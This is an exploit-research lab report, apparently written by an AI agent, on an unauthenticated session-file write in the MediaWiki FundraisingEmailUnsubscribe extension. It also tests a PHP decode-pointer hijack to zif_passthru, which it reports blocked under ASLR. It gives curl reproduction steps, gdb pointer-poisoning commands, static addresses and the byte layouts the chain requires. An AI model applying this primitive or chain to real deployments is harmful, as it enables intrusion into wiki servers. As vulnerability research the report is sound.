# MediaWiki native-session write candidate + `ps_serializers[].decode` chain test

Receipt: `/tmp/opencode/research/mw_session_20261022T031700Z`
Date: 2026-10-22 (UTC+02:00)
Stack: private MediaWiki 1.46.2 / nginx 1.30.1 `127.0.0.1:28866` / PHP-FPM 8.5.10 / MariaDB 11.4.5 `127.0.0.1:33309`

## 0. Verdict

**Real installable candidate found, installed, and exercised.**

`mediawiki/extensions/FundraisingEmailUnsubscribe` (Gerrit, `extension.json` requires MediaWiki
`>= 1.39.0`) writes attacker-influenced request data into the native PHP session. On this lab it
produced real `sess_<id>` files, unauthenticated, including through the `p=optin` path that needs
**no login, no token and no hash**. With the pool's `session.save_path` pointed at a web-served
directory under the nginx docroot, the resulting session file was fetched back over HTTP 200
byte-for-byte.

**The `ps_serializers[].decode -> zif_passthru` chain is not reachable from this extension's
session file.** Three independent blockers were measured:

1. **Layout.** The extension writes exactly **one** top-level session variable, under the fixed
   config key `fr-unsub`, whose value is a 5-element array. The F12b chain requires **16**
   top-level `name|value` variables: 15 filler values of 1,900,000 bytes, then a 16th variable
   whose *name* is the 768-byte fake `zend_execute_data` block, then `z|i:<K>`.
2. **Byte constraints.** MediaWiki normalizes every request string (`WebRequest::getGPCVal()` ->
   `Language::normalize()`), so NUL, control bytes and invalid UTF-8 become U+FFFD. The F12b
   blob and fake structures need raw little-endian addresses containing NUL bytes.
3. **ASLR.** The current worker is ASLR-on (`randomize_va_space=2`, `personality=00000000`).
   The first-decode write requires `K = (target - (B0f + 0x10)) / 16` with `B0f` an absolute heap
   address; the second decode requires `F = S + 0x200`, an absolute session-buffer address.
   No in-band heap/stack leak exists on this stack (prior receipt
   `/tmp/opencode/research/aslrleak_20261022T011500Z/README.md`, negative). Decode-buffer
   addresses measured in this run varied per request (`0x7f7657dfa680`, `0x7f7656c01000`,
   `0x7f76585fa698`, `0x7f7655601000`).

A negative control makes the fake-execute-data requirement explicit: after setting
`ps_serializers[1].decode = zif_passthru` by hand in gdb, a request carrying the real extension
file calls `zif_passthru` with `execute_data` pointing at `"fr-unsub|a:5:{..."`. Parameter parsing
fails (`ArgumentCountError: session_start() expects at least 1 argument, 0 given`), HTTP 500 is
returned, no command executes, and the worker survives. The poison was then restored to
`ps_srlzr_decode_php` (`0x9e6fae`).

No fabricated pass: full chain remains proven only ASLR-off (prior F12b receipt
`/tmp/opencode/research/f12b_passthru_20261021T224157Z/README.md`); this receipt adds the real
MediaWiki write primitive and the byte-level/ASLR blockers for the MediaWiki path.

## 1. Stack and binary

| Item | Value |
|---|---|
| MediaWiki | `1.46.2` (`includes/Defines.php:23`) |
| Docroot | `/tmp/opencode/research/wikitype_20261021T212610Z/www/mediawiki` |
| nginx | 1.30.1, `127.0.0.1:28866`, root = docroot above |
| PHP-FPM | `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`, PHP 8.5.10 (fpm-fcgi), `ET_EXEC`, non-PIE, md5 `4ee099823b75e16ea36f93c71d57bfd8`, sha256 `aa07f440b08ce27a236399a77a5e3744798ac9d2dad0ae1268f3b01a39a2f3b4` |
| PHP CLI used for hashes | same install, `bin/php`, sha256 `5b2fd5101287f7104007b18a83c4242b43ca4027450c1a2e0a5c0c11fa40b06d` |
| MariaDB | 11.4.5, `127.0.0.1:33309` |
| ASLR | `kernel.randomize_va_space=2`; worker `personality=00000000` |
| Session ini (pool) | `save_handler=files`, `save_path` (initially `.../sessions`, temporarily docroot `sessions_web`, then restored), `serialize_handler=php`, `use_strict_mode=0`, upload-progress enabled/cleanup=0/prefix="" |
| Static symbols | `ps_serializers=0x22c54b8` entry base, active `decode` at `0x22c54c8`; `ps_srlzr_decode_php=0x9e6fae`; `zif_passthru=0xa3c074` |

The lab pool sets `php_admin_value[session.save_handler]=files` (line 32 of
`/tmp/opencode/research/wikitype_20261021T212610Z/conf/fpm.conf`). That admin value keeps PHP's
native files handler active; MediaWiki's `PHPSessionHandler` is installed but inert for the
storage path (measured in the prior probe phase: `session_module_name()="files"` while a pool
without the admin value shows `"user"`). This is the configuration that makes the native-session
write observable, and it matches a deployment whose `save_path` is file-based and web-served.

## 2. Candidate discovery (scan of all Gerrit extensions/skins at HEAD)

Corpus:

- `1327` `mediawiki/extensions/*` tarballs (of 1333 Gerrit projects; 6 have no HEAD tarball)
- `68` `mediawiki/skins/*` tarballs
- stored under `src_all/` and `skins/`; per-extension hit files in `hits/`
- project list: `log/extension_names_full.txt`

Result:

- **Zero** PHP `session_start(` in all 1327 extensions and 68 skins. The only literal hits are
  JavaScript/Vue occurrences (`CheckUser`, `CodeEditor`).
- Replicating the MediaWiki 1.45 release-notes codesearch (`\$_SESSION|\bsession_\w+\s*\(`)
  yields 8 extensions (`log/things_ext_list.tsv`): AccessControl, DonationInterface,
  FundraisingEmailUnsubscribe, Persona, PluggableSSO, SemanticPageSeries, Shibboleth, Sudo.
- Code inspection of those 8:

| Extension | Session use | Verdict |
|---|---|---|
| AccessControl | `src/AccessControlHooks.php:780-782` only `unset($_SESSION['redirect'])` | no write |
| DonationInterface | own `session_ensure()`, false positive for native session | no native write |
| FundraisingEmailUnsubscribe | `FundraiserSubscriptionPage.php:413-432`: `persist()` then writes `process`, `variant`, `email`, `id`, `class-data` | **candidate** |
| Persona | `Persona.php:102-103` calls removed core `wfSetupSession()`, only unsets `persona_email` | not installable on 1.46 |
| PluggableSSO | `src/PluggableSSO.php:99` writes an integer user id from `REMOTE_USER`/session user | int only, no request-string layout |
| SemanticPageSeries | uses `$request->setSessionData()` (MediaWiki session API) | not native `$_SESSION` |
| Shibboleth | `Shibboleth.class.php:45` `session_destroy()` only | no write |
| Sudo | requires login (`wsSudoId`) | not unauthenticated |

Archived third-party `github.com/arusso23/CASAuth` does call `session_start()` directly
(`CASAuth.php:237,250,271,284`) but is MediaWiki 1.16-era, archived, and depends on removed
`Language::factory`, `$wgUser` and phpCAS; it is not installable here and its writes are
post-authentication. It is therefore not the candidate.

## 3. Installation of the candidate

- Tarball: `src_all/FundraisingEmailUnsubscribe.tar.gz`, sha256
  `18db97ec05204fb036093070425cc35ab7d38fe73366ba45398026552c644eb6`; `extension.json` says
  version `2.1.0`, `"MediaWiki": ">= 1.39.0"`.
- Copied to `www/mediawiki/extensions/FundraisingEmailUnsubscribe`; added to `LocalSettings.php`
  line 150:

```php
wfLoadExtension( 'FundraisingEmailUnsubscribe' );
```

- Composer 2.10.3 was downloaded and `composer install --no-dev --prefer-dist` run in the
  extension directory. Installed: `twig/twig 3.30.0`, `predis/predis 2.4.1`,
  `coderkungfu/php-queue 1.0.3`, `monolog/monolog 3.12.1`, `clio/clio 0.1.8`, `psr/log 3.0.2`,
  `symfony/polyfill-*`, `symfony/deprecation-contracts` (`phase/composer_show.txt`).
- Key hashes: `extension.json`
  `3bfad46a7df98846bbf666984b6be0e4593493d1d2d4e8efbca4de0ed245bbe9`;
  `FundraiserSubscriptionPage.php`
  `91f4dd7c80ec789698e9bb838472b02bb0f20202a0706c47225ed84d2f0fb1c7`.
- The special pages `Special:FundraiserSubscribe` and `Special:FundraiserUnsubscribe` load and
  render (HTTP 200) on MediaWiki 1.46.2.

## 4. Native session write evidence

### 4.1 Call path

The extension does not call `session_start()` itself; it calls the MediaWiki API that starts the
native session:

- `extensions/FundraisingEmailUnsubscribe/FundraiserSubscriptionPage.php:413`
  `SessionManager::getGlobalSession()->persist();`
- `includes/Session/Session.php:118-120` `persist()` -> `backend->persist()`
- `includes/Session/SessionBackend.php:360-374` sets `persist/forcePersist/metaDirty` and calls
  `autosave()`
- `SessionBackend.php:712-718` `autosave()` -> `save()`
- `SessionBackend.php:807` `save()` calls `checkPHPSession()`
- `SessionBackend.php:884-901` `checkPHPSession()`: `session_id((string)$this->id); @session_start();`
- `includes/Setup.php:495` installs `PHPSessionHandler`;
  `includes/Session/PHPSessionHandler.php:129` `@session_set_save_handler(self::$instance, true)`
  (overridden by the pool's admin `save_handler=files`)
- `includes/Setup.php:536` `session_start()` on the global session path

After `session_start()` is active, the extension writes at
`FundraiserSubscriptionPage.php:423-432`:

```php
$_SESSION[$sessionKey]['process'] = $this->mProcess;
$_SESSION[$sessionKey]['variant'] = $this->mVariant;
$_SESSION[$sessionKey]['email']   = $this->mEmail;
$_SESSION[$sessionKey]['id']      = $this->mID;
...
$_SESSION[$sessionKey]['class-data'][get_class( $classObj )] = $params;
```

`$sessionKey` is the config value `FundraisingEmailUnsubscribeSessionKey`, default `fr-unsub`
(`extension.json`). `loadSessionData()` reads the same key at lines 540-551; `clearData()`
unsets it at line 565.

### 4.2 Primary request: `p=optin`, no login, no token, no hash

`optin` is a default process (`extension.json`:
`"optin": ["FundraiserSubscribe"]`). `FundraiserSubscribe` requires only `email`
(`methods/FundraiserSubscribe.php:31`, filter `/.*@.*/`) and validates it with
`Sanitizer::validateEmail()`; there is no hash and no authentication.

Request (no cookie sent; fresh client):

```
GET /index.php?title=Special:FundraiserSubscribe&p=optin&e=optin%40example.com&v=free1
```

Response: `HTTP/1.1 200`, `Set-Cookie: wikidb_session=69195g9mph1dhfg7bq6gk2q6t42m52sn`.

File `sess_69195g9mph1dhfg7bq6gk2q6t42m52sn` (223 bytes) in the configured save path:

```
fr-unsub|a:5:{s:7:"process";s:5:"optin";s:7:"variant";s:5:"free1";s:5:"email";s:17:"optin@example.com";s:2:"id";i:5723556920359;s:10:"class-data";a:1:{s:19:"FundraiserSubscribe";a:1:{s:5:"email";s:17:"optin@example.com";}}}
```

- Size: 223 bytes
- sha256: `95c636af8ffc6e88dd1d53521922f464b16832c6ce6cc6bcb14c58fc602c50fa`
- Copy: `phase/session_file_optin.bin`
- Journal: `phase/journal_ext_tail.txt` shows `Starting process 'optin' ... Resolved parameter
  'email' ... Running FundraiserSubscribe verification`.

### 4.3 Large no-auth write

To show the write is not size-limited by the extension:

```
POST /index.php?title=Special:FundraiserSubscribe
Content-Type: application/x-www-form-urlencoded

p=optin&e=big%40example.net&v=<1,900,000 × 'B'>
```

File `sess_oufe5d579ahmh3hlqt1jq00i7pos0nll`:

- Size: 1,900,220 bytes
- sha256: `ea3e979db5f61a78e997e236f3087fc12eaf7012c9243ba29a17e3d999298695`
- Prefix: `fr-unsub|a:5:{s:7:"process";s:5:"optin";s:7:"variant";s:1900000:"BBBB...`
- Copy: `phase/session_file_optin_big.bin`; fetch copy:
  `phase/session_file_optin_big_fetch.bin` (identical)

### 4.4 The `thankyou` path (hash) also writes

With `p=thankyou&e=victim%40example.com&c=1&h=708b335f...` and the default empty
`$wgFundraisingEmailUnsubscribeHashSecretKey`, the file contained:

```
fr-unsub|a:5:{s:7:"process";s:8:"thankyou";s:7:"variant";s:3:"abc";s:5:"email";s:18:"victim@example.com";s:2:"id";i:8756387450639;s:10:"class-data";a:1:{s:29:"FundraiserUnsubscribeThankYou";a:3:{s:4:"hash";s:40:"708b...";s:15:"contribution-id";s:1:"1";s:5:"email";s:18:"victim@example.com";}}}
```

326 bytes, sha256 `2d4814490952283388692a9df5264dd9256def4cead3e2a18a90cd1495daab4d`
(`phase/session_file_real_ext_1.bin`). Journal: `Hash verification success!`.
With a non-empty production secret this path needs a genuine unsubscribe link, but the `optin`
path above needs no secret at all. The empty-secret default is visible in `extension.json`
(`"FundraisingEmailUnsubscribeHashSecretKey": ""`).

## 5. Web-served save path and HTTP retrieval

The pool's `session.save_path` was temporarily changed to a docroot subdirectory of the same
nginx server:

```
php_admin_value[session.save_path] = /tmp/opencode/research/wikitype_20261021T212610Z/www/mediawiki/sessions_web
```

(still `save_handler=files`, `serialize_handler=php`). The private FPM master was reloaded
(`USR2`; only this lab's master), the directory created mode 0777, and the `p=thankyou` request
re-driven:

- Request: `p=thankyou&e=webserved%40example.org&c=42&v=web1&h=247c8363...`
  (`variant=web1`, email `webserved@example.org`)
- Response `Set-Cookie: wikidb_session=cbo2f1cicjmod10u2ko3rg9mj4lffqbq`
- File written in `sessions_web/sess_cbo2f1cicjmod10u2ko3rg9mj4lffqbq`, 334 bytes
- Fetched with a plain unauthenticated GET:

```
GET /sessions_web/sess_cbo2f1cicjmod10u2ko3rg9mj4lffqbq
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Content-Length: 334

fr-unsub|a:5:{s:7:"process";s:8:"thankyou";s:7:"variant";s:4:"web1";s:5:"email";s:21:"webserved@example.org";s:2:"id";i:8401841784036;s:10:"class-data";a:1:{s:29:"FundraiserUnsubscribeThankYou";a:3:{s:4:"hash";s:40:"247c8363...";s:15:"contribution-id";s:2:"42";s:5:"email";s:21:"webserved@example.org";}}}
```

- File sha256 == HTTP body sha256:
  `7044a4b8ab93f92310acc2f8d1f4d39502f97109d8bf5a009fc5158dd6033f2d`
- `cmp` says IDENTICAL (`phase/session_file_web_written.bin` vs
  `phase/session_file_web_fetch.bin`)
- The 1.9 MB optin file was also fetched: HTTP 200, `application/octet-stream`, 1,900,220 bytes,
  identical sha256 `ea3e97...` (`phase/session_file_optin_big_fetch.bin`).
- Fetch headers: `req/sess_http_hdr.txt`, `req/optin_fetch_hdr.txt`,
  `req/optin_big_fetch_hdr.txt`.

This proves the write lands as a readable file in a web-served directory. It does not claim that
every MediaWiki deployment uses a web-served file save path; the lab reproduces the stated
premise.

## 6. What request data can enter the file (and what cannot)

| Session field | Source | Filter / validation | Notes |
|---|---|---|---|
| `process` | `p` | `/[a-zA-Z0-9]*/`, must be a key of `FundraisingEmailUnsubscribeProcesses` | fixed set: `thankyou`, `silverpop`, `optin` |
| `variant` | `v` | `/[a-zA-Z0-9_-]*/` | free-form alnum/`_`/`-`, can be 1.9 MB (measured) |
| `email` | `e` (via `rawurldecode`) | `/.*@.*/`; `optin` additionally `Sanitizer::validateEmail()`; `thankyou` covered by hash | valid UTF-8 only |
| `id` | `rand(1e12, 9e12)` | none | server-generated |
| `class-data[<class>]` | class param maps | per-class filters; keys are class names | array keys fixed by installed class |
| `hash` / `contribution-id` / `mailing-id` / ... | `h`, `c`, `m`, `r`, `j`, `l` | alnum / digits | `hash` must equal `sha1(c . email . secret)` for `thankyou`/`silverpop` |

Byte constraint, measured:

- `WebRequest::getGPCVal()` (`includes/Request/WebRequest.php:451-475`) skips normalization only
  for ASCII printable strings; otherwise it calls `normalizeUnicode()` (`WebRequest.php:430-440`)
  -> `Language::normalize()`, which replaces invalid UTF-8 and control bytes.
- A POSTed email `opt\x00bin|"X\x01\xff@example.org` was logged by the extension as
  `opt\ufffdbin|"X\ufffd\ufffd@example.org` (`phase/journal_ext_tail.txt`, 03:44:56). The NUL and
  invalid bytes never reached the session file.
- Consequence: no NUL bytes, no raw 64-bit pointers, no arbitrary binary blob. The F12b fake
  `zend_execute_data` and forged `php_unserialize_data` fields are impossible to express.

Filename control is also denied: sending `Cookie: wikidb_session=attackerchosen01` produced
`Set-Cookie: wikidb_session=deleted` plus a fresh random id, and no `sess_attackerchosen01` file
(`req/chosen_sid_hdr.txt`). MediaWiki chooses the session id; `session.use_strict_mode=0` at the
PHP layer is not sufficient because MediaWiki's own session store validates the id.

## 7. Chain test against the real extension file

### 7.1 F12b requirements (prior receipt)

From `/tmp/opencode/research/f12b_passthru_20261021T224157Z/README.md`:

- Target: `ps_serializers[1].decode` at `0x22c54c8`
- Write value: `zif_passthru` at `0xa3c074` (non-PIE static address)
- Session record: 15 variables `k0..k14` each with a 1,900,000-byte value, then a variable whose
  **name** is the 0x300-byte fake `zend_execute_data` (no `|` byte), then `z|i:<K>`
- First decode needs the 16th 1.9 MB value's `ZSTR_VAL` at `chunk+0x1018` and the blob at
  `p_off=0x18afe8`; it forges `last_dtor`/`used_slots` and computes
  `K=(0x22c54c8-(B0f+0x10))/16` (negative, `B0f` heap absolute)
- Second decode (upload-progress flush) passes the re-encoded buffer as `execute_data`; required
  bytes: `S+0x18=F`, `S+0x2c=1` (`num_args`), `S+0x50=F`, `S+0x58=6` (`IS_STRING`), with
  `F=S+0x200` and the command at `F+0x18`

### 7.2 Actual file vs requirements

`phase/layout_offsets.txt`; the 334-byte thank-you file:

```
offset 0x00: "fr-unsub|a:5:{s:7:\"process\";..."
first '|' at 8; exactly one top-level variable
0x18: bytes 'ss";s:8:'  qword 0x3a383a733b227373   (required: F, a valid pointer)
0x2c: bytes ':7:"vari'   qword 0x69726176223a373a   (required: 1 for num_args)
0x50: bytes 's:21:"we'   qword 0x6577223a31323a73   (required: F)
0x58: bytes 'bserved@'   qword 0x4064657672657362   (required: 6, IS_STRING)
```

The 1.9 MB optin file is the same shape (`fr-unsub|a:5:{s:7:"process";s:5:"optin";...`);
`0x18` is still ASCII and `0x50`/`0x58` are `'B'` bytes in the big-variant case. The top-level key
is fixed by `FundraisingEmailUnsubscribeSessionKey`; it is not request-controlled.

Quantitatively: the extension can put at most a small fixed set of huge strings into the one
array (`variant`, top-level `email`, per-class `email`, and alnum/digit fields such as
`contribution-id`, `mailing-id`, `job-id`, `recipient-id`, `list-id`). All are nested inside
`a:5:{...}` and none is a top-level variable. Even if a decode request consumed 4-9 cached
chunks, the F12b geometry needs 15 filler values before the 16th; the extension's array cannot
supply them. The trailing `z|i:K` variable is also impossible (only one key).

### 7.3 Normal decode of the real file (ASLR-on worker)

gdb attached to worker `1439895` with breakpoints on `php_session_decode` and
`ps_srlzr_decode_php`, plus a hardware watchpoint on `0x22c54c8`:

```
=== PHP_SESSION_DECODE ===
ps_globals.serializer=0x22c54b8
0x22c54c8 <ps_serializers+40>: 0x00000000009e6fae 0x0000000001018cef
=== PS_SRLZR_DECODE_PHP HIT ===
val=0x7f7657dfa698 "fr-unsub|a:5:{...}", vallen=334
#1 php_session_decode (data=0x7f7657dfa680)
```

- `ps_serializers[1].decode` stayed `0x9e6fae`; the watchpoint never fired
- HTTP 302 (normal cancel redirect); worker `1439895` stayed alive
- Same result for the 1.9 MB optin file (`val=0x7f7655601018`, vallen=1,900,220; HTTP 302;
  no watchpoint; same PID)
- Logs: `gdb/decode_real_ext.log`, `gdb/decode_optin_big.log`

### 7.4 Negative control: poison `decode` and feed the real file

The decode pointer was set by gdb to `zif_passthru` in the live worker (only this lab's worker):

```
set {unsigned long}0x22c54c8 = 0xa3c074
0x22c54c8: 0x0000000000a3c074 0x0000000001018cef
```

A request carrying the 328-byte extension file `sess_gqckop4r8qtf6ljgc4t6a87rf0ojctru` was sent
with `Cookie: wikidb_session=gqckop4r8qtf6ljgc4t6a87rf0ojctru`. gdb hit the poisoned call:

```
=== ZIF_PASSTHRU NEGCTL ===
rdi(execute_data)=0x7f76585fa698 rsi(return_value)=0x148
0x7f76585fa698: 0x66 0x72 0x2d 0x75 0x6e 0x73 0x75 0x62   ("fr-unsub")
#0 zif_passthru (execute_data=0x7f76585fa698, return_value=0x148)
#1 php_session_decode (data=0x7f76585fa680)
```

Result:

- Session buffer is passed as `zend_execute_data`; offset 0 is the fixed key, not a fake
  `zend_execute_data`
- `zif_passthru`'s argument parsing fails before `php_exec_ex`;
  HTTP 500 body: `ArgumentCountError: session_start() expects at least 1 argument, 0 given`
- No command executed; worker `1439895` stayed alive; no SIGSEGV entry in
  `log/fpm-error.log`
- The pointer was restored to `0x9e6fae` (`gdb/restore_decode2.log`), health check
  `GET /index.php?title=Main_Page` returned 200, same worker; the final lab worker `1666499`
  (after the save-path restore reload) also shows `0x9e6fae`.

Logs: `gdb/negctl_trace.log`, `req/negctl_poison.html`, `gdb/restore_decode2.log`.

This is the runtime proof that the fake execute_data is mandatory: a poisoned decode pointer
alone does not execute anything and the real extension layout cannot impersonate the F12b
record.

## 8. ASLR status

- `cat /proc/sys/kernel/randomize_va_space` -> `2`
- worker `personality` -> `00000000` (no `ADDR_NO_RANDOMIZE`)
- Decode buffers from four requests in the same worker:
  `0x7f7657dfa680`, `0x7f7656c01000`, `0x7f76585fa680`, `0x7f7655601000` (per-request
  randomization/mmap reuse).
- F12b's first stage requires `B0f` (heap) to compute `K`; its second stage requires `S`
  (heap) for `F=S+0x200`. Neither is derivable from the session file, the HTTP response, or the
  extension's data. The prior leak survey (`aslrleak_20261022T011500Z`) found no in-band heap
  pointer on this stack; no new leak was found here.
- Therefore the chain is **not completable ASLR-on** from this MediaWiki path. The prior full
  chain run is explicitly ASLR-off (`f12b_passthru_20261021T224157Z`).

## 9. Blockers (exact)

1. **No Gerrit extension/skin calls native `session_start()` literally.**
   1327 extensions + 68 skins scanned; zero PHP hits. The candidate starts it through
   `SessionBackend::checkPHPSession()` at `includes/Session/SessionBackend.php:884-901`
   (`@session_start()` at line 901), reached from `persist()` (`SessionBackend.php:360`).
   This is a real native-session start, but it is core-mediated, not a literal call in the
   extension.
2. **One top-level session variable, fixed key.**
   `FundraiserSubscriptionPage.php:423-432` writes only `$_SESSION['fr-unsub']`; no code in the
   extension writes another top-level key (grep over the extension, `$sessionKey` is the config
   key). F12b needs 16 top-level variables and a 768-byte binary name.
3. **UTF-8 normalization.**
   `WebRequest.php:462-472` -> `Language::normalize()` turns NUL/control/invalid bytes into
   U+FFFD (measured). F12b's forged structures need raw little-endian addresses (NUL bytes).
4. **ASLR-on and no heap leak.**
   `K` depends on `B0f`, `F` depends on `S`; both are absolute heap addresses. No in-band leak
   exists (prior receipt). Static target `0x22c54c8` is known (non-PIE), but that is not enough.
5. **Validation/filename constraints (context, not the main chain blocker).**
   `optin` requires `Sanitizer::validateEmail()`; `thankyou`/`silverpop` require the hash
   (`sha1(contribution-id . email . secret)`); the extension default secret is empty, so the lab
   is forgeable, but a production deployment that sets it requires a genuine link. The session
   filename is chosen by MediaWiki, not the attacker (`req/chosen_sid_hdr.txt`).

## 10. Residual lab state

- `sessions_web/` was removed from the docroot after evidence capture; `session.save_path` was
  restored to `/tmp/opencode/research/wikitype_20261021T212610Z/sessions` and the private FPM
  master reloaded (new master `1666498`, worker `1666499`; health 200).
- Temporary probes removed from the docroot (hashes in `phase/probe_hashes.txt`):
  `mw_session_probe.php`, `mw_handler_probe.php`, `mw_handler_probe2.php`.
- Minimal hbtest FPM/nginx instances from this receipt's earlier phase were stopped
  (pids 1422314 / 1422085).
- `FundraisingEmailUnsubscribe` remains installed and enabled in the lab (`LocalSettings.php`
  line 150) so the write can be re-driven; this is the only lasting lab change.
- The decode pointer in the final worker is the stock `0x9e6fae` (`gdb/final_worker_state.log`).
- Shared services were not touched.

## 11. Reproduction sketch

```bash
# 1. install candidate (already done in this lab)
cp -a src_all-extracted/FundraisingEmailUnsubscribe \
  /tmp/opencode/research/wikitype_20261021T212610Z/www/mediawiki/extensions/
cd .../extensions/FundraisingEmailUnsubscribe
php /tmp/opencode/composer.phar install --no-dev --prefer-dist
echo "wfLoadExtension( 'FundraisingEmailUnsubscribe' );" >> .../LocalSettings.php

# 2. no-auth write (p=optin)
curl -sS -c /tmp/cj -D /tmp/hdr \
  'http://127.0.0.1:28866/index.php?title=Special:FundraiserSubscribe&p=optin&e=optin%40example.com&v=free1'
SID=$(sed -n 's/.*wikidb_session=\([^;]*\).*/\1/p' /tmp/hdr | head -1)
ls -l .../sessions/sess_$SID
cat .../sessions/sess_$SID

# 3. large no-auth write
python3 - <<'PY'
open('/tmp/big.body','wb').write(b'p=optin&e=big%40example.net&v=' + b'B'*1900000)
PY
curl -sS -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary @/tmp/big.body \
  'http://127.0.0.1:28866/index.php?title=Special:FundraiserSubscribe'

# 4. web-served path (lab change)
sed -i 's#^php_admin_value\[session.save_path\].*#php_admin_value[session.save_path] = .../www/mediawiki/sessions_web#' .../conf/fpm.conf
mkdir -m 0777 .../www/mediawiki/sessions_web
kill -USR2 <private fpm master>
# drive step 2/3 again, then:
curl -i http://127.0.0.1:28866/sessions_web/sess_$SID
```

Chain test (requires gdb and a controlled worker) is documented in `gdb/`:

- `decode_real_ext.gdb`, `decode_big_ext.gdb`, `decode_optin_big.gdb` — normal-decode traces
- `poison_decode.log` / `poison_decode2.log` — write `0xa3c074` into `0x22c54c8`
- `negctl_trace.gdb` — breakpoint at `zif_passthru`, capture `rdi` = session buffer
- `restore_decode.log` / `restore_decode2.log` / `final_worker_state.log` — restore/verify

## 12. Evidence index

| Path | Contents |
|---|---|
| `phase/session_file_optin.bin` | 223 B no-auth `p=optin` session file, sha256 `95c636...` |
| `phase/session_file_optin_fetch.bin` | HTTP fetch of the above, identical |
| `phase/session_file_optin_big.bin` | 1,900,220 B no-auth `p=optin` with 1.9 MB variant, sha256 `ea3e97...` |
| `phase/session_file_optin_big_fetch.bin` | HTTP fetch, identical |
| `phase/session_file_real_ext_1.bin` | 326 B `p=thankyou` file (hash path), sha256 `2d4814...` |
| `phase/session_file_web_written.bin` | 334 B file written into docroot `sessions_web` |
| `phase/session_file_web_fetch.bin` | HTTP fetch of the above, sha256 `7044a4...`, identical |
| `phase/session_file_big_variant.bin` | 1.9 MB `thankyou` file, sha256 `af5461...` |
| `phase/session_file_big_variant_fetch.bin` | HTTP fetch, identical |
| `phase/session_file_crash.bin`, `phase/session_file_negctl.bin` | 328 B files used for poison controls |
| `phase/layout_offsets.txt` | Byte offsets vs F12b requirements |
| `phase/journal_ext_tail.txt` | syslog/journal lines: process, resolved params, hash success, UTF-8 replacement |
| `phase/composer_show.txt` | Installed composer packages |
| `phase/probe_hashes.txt` | Hashes of removed docroot probes |
| `phase/sessions_web_listing_before_cleanup.txt` | Pre-cleanup listing and hashes |
| `req/` | Request/response headers and bodies (Set-Cookie, 200/302/500, fetch headers) |
| `gdb/decode_real_ext.log` | Normal decode of the real file; no target write |
| `gdb/decode_optin_big.log` | Normal decode of the 1.9 MB file; no target write |
| `gdb/negctl_trace.log` | Poisoned decode with `rdi="fr-unsub..."`; ArgumentCountError |
| `gdb/poison_decode*.log`, `restore_decode*.log`, `final_worker_state.log` | Pointer write/restore/verify |
| `log/extension_names_full.txt` | 1333 Gerrit extension project names |
| `log/things_ext_list.tsv` | The 8 `$_SESSION|session_` candidates from codesearch replication |
| `hits/` | Per-extension scan hit files (zero PHP `session_start`) |
| `src_all/FundraisingEmailUnsubscribe.tar.gz` | Candidate tarball, sha256 `18db97...` |

`SHA256SUMS` covers `README.md`, `phase/`, `req/`, `gdb/`, and the two scan summary logs; the
1327-tarball scan corpus is not re-hashed here (candidate tarball hash is recorded above).

## 13. Bottom line

- **Write primitive:** PASS — real Gerrit extension, unauthenticated `p=optin` request, native
  `sess_<id>` file with request-derived `process`/`variant`/`email`/`id`, up to 1.9 MB, and
  web-served retrieval byte-for-byte.
- **`ps_serializers[].decode -> zif_passthru` chain from that file:** FAIL/BLOCKED — the file is a
  single fixed-key array, not the 16-variable F12b record; request bytes are UTF-8-normalized;
  ASLR-on and no heap leak means `K`/`F` are unknown.
- **Poisoned-decode negative control:** the real file reaches `zif_passthru` with the file bytes
  as `execute_data`, fails argument parsing, executes nothing, and the worker survives.
- **Worker survival (normal real-file decode):** PASS — same worker PID across 334 B and 1.9 MB
  decodes, health checks 200.
- **ASLR-on status:** ON, no in-band leak; full chain remains an ASLR-off result (prior F12b).

## 14. Repository curation note (this copy)

This `receipts/` copy keeps the README, all small captured evidence, the GDB traces, request
metadata and the scan summary logs. Six multi-MB blobs remain only in the local archive
`/tmp/opencode/research/mw_session_20261022T031700Z/` and were left out of the repo copy to avoid
duplicating ~11.4 MB of byte-identical fetch copies:

| Excluded file | Size (B) | SHA-256 |
|---|---|---|
| `phase/session_file_big_variant.bin` | 1,900,323 | `af54618a8bcdd1a96097d750025eb57f7249f9378a1a0c67cb72b873650cedab` |
| `phase/session_file_big_variant_fetch.bin` | 1,900,323 | `af54618a8bcdd1a96097d750025eb57f7249f9378a1a0c67cb72b873650cedab` |
| `phase/session_file_optin_big.bin` | 1,900,220 | `ea3e979db5f61a78e997e236f3087fc12eaf7012c9243ba29a17e3d999298695` |
| `phase/session_file_optin_big_fetch.bin` | 1,900,220 | `ea3e979db5f61a78e997e236f3087fc12eaf7012c9243ba29a17e3d999298695` |
| `req/big_variant_body.txt` | 1,900,080 | `8cc3f4ce437a6c955b64ef5dfcd2bb951cdc3b5f7b1ccfed53dabd86607f3092` |
| `req/optin_big_body.txt` | 1,900,030 | `5826d427273b1d4bb1206a49b42d6a17127bdc8c4432239d844b59a18a8dd840` |

The written/fetch pairs are byte-identical (same hash per pair), which is the web-served retrieval
result cited in §0 and §12. The local `SHA256SUMS` covers the full set (103 files); this copy's
`SHA256SUMS` covers the 97 copied files plus `SHA256SUMS.excluded-local-archive` (the six hashes
above in `sha256sum` format for audit against the local archive).
